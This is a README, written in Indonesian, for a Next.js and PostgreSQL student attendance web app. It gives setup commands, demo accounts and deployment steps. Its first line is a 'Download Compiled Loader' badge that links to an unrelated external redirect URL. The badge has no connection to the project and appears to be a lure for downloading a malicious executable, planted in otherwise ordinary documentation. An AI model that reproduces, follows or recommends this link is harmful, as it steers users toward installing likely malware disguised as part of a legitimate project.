# App Absensi SDN 1 Bintaro

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Aplikasi absensi siswa berbasis web untuk mengelola data kelas, siswa, input absensi harian, rekap bulanan, dan laporan kehadiran.

## Tech Stack

- Next.js 15 App Router
- React 19
- TypeScript
- PostgreSQL
- Prisma ORM
- NextAuth.js v5 credentials provider
- Tailwind CSS v4
- Bun

## Fitur

- Login admin dan guru
- Dashboard statistik kehadiran
- Input absensi per kelas dan tanggal
- Bulk action set semua siswa hadir
- Manajemen siswa dengan pencarian, filter kelas, pagination, modal tambah/edit, hapus, dan import CSV
- Detail siswa dengan statistik, kalender bulanan, dan riwayat absensi
- Manajemen kelas
- Laporan bulanan per siswa
- Export laporan ke CSV
- Print-friendly report
- Role access: admin mengelola semua data, guru dibatasi pada kelas yang ditugaskan

## Setup Lokal

Install dependency:

```bash
bun install
```

Salin file environment:

```bash
cp .env.example .env
```

Contoh `.env` untuk PostgreSQL lokal:

```env
DATABASE_URL="postgresql://absensi:absensi123@localhost:5432/absensi_db"
NEXTAUTH_SECRET="local-development-secret-change-before-production"
AUTH_SECRET="local-development-secret-change-before-production"
NEXTAUTH_URL="http://localhost:3000"
```

Jalankan PostgreSQL dengan Docker:

```bash
docker run --name absensi-postgres \
  -e POSTGRES_USER=absensi \
  -e POSTGRES_PASSWORD=absensi123 \
  -e POSTGRES_DB=absensi_db \
  -p 5432:5432 \
  -d postgres:16-alpine
```

Jalankan migration dan seed:

```bash
bun prisma migrate dev --name init
bun prisma db seed
```

Jalankan aplikasi:

```bash
bun run dev
```

Buka:

```txt
http://localhost:3000
```

## Akun Demo

Admin:

```txt
admin@sekolah.sch.id
admin123
```

Guru:

```txt
guru@sekolah.sch.id
guru123
```

## Script

```bash
bun run dev
bun run build
bun run lint
bun prisma generate
bun prisma migrate dev
bun prisma db seed
```

## Deployment

Aplikasi siap deploy ke Vercel.

Tambahkan environment variable berikut di Vercel:

```env
DATABASE_URL="postgresql://..."
NEXTAUTH_SECRET="..."
AUTH_SECRET="..."
NEXTAUTH_URL="https://domain-vercel.vercel.app"
```

Gunakan PostgreSQL dari Neon, Supabase, Vercel Postgres, atau provider PostgreSQL lain. Jalankan migration ke database production sebelum digunakan.
